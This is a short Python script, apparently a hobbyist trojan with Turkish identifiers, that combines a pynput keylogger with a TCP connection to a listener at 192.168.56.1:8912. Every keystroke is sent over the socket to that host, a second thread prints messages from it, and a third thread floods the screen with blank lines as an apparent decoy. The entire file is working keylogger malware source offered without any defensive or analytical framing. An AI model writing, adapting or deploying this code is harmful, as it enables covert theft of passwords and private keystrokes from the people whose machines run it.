from pynput import keyboard
import sys
import time
import socket
import threading


IP = "192.168.56.1"
Port = 8912
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)




def new_thread(f, args):

    t = threading.Thread(target=f, args=args)
    t.start()
    return t


def main():

    global sock

  
    try:
        sock.connect((IP, Port))

    except Exception:

        print("Baglantı Hatası")
        sys.exit(1)

    t1 = new_thread(Trojen, ())
    t2 = new_thread(keylogger, ())
    t3 = new_thread(Server, ())

 
    sock.send(b"Trojen Server ")


    while True:
        if any(not t.is_alive() for t in [t1, t2, t3]):
            sock = None
            sys.exit(0)





def keylogger():

    def on_press(key):

        if sock is None:
            sys.exit(0)

        try:
            sock.send(bytes(str(key).encode('utf-8')))
        except Exception as e:
            sys.exit(1)

  
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()




def Server():

    while True:
        if sock is None:
            sys.exit(0)

        data = sock.recv(1024).decode('utf-8')

        if not data:
            sys.exit(0)

        print("[Server] " + data)

############################################################################


bosluk1 = r"""
      
        """


bosluk2 = r"""
         
        """


def Trojen():

    while True:

        if sock is None:
            sys.exit(0)

        print("\n" * 80 + bosluk1)

        time.sleep(1)

        print("\n" * 80 + bosluk2)

        time.sleep(1)



main()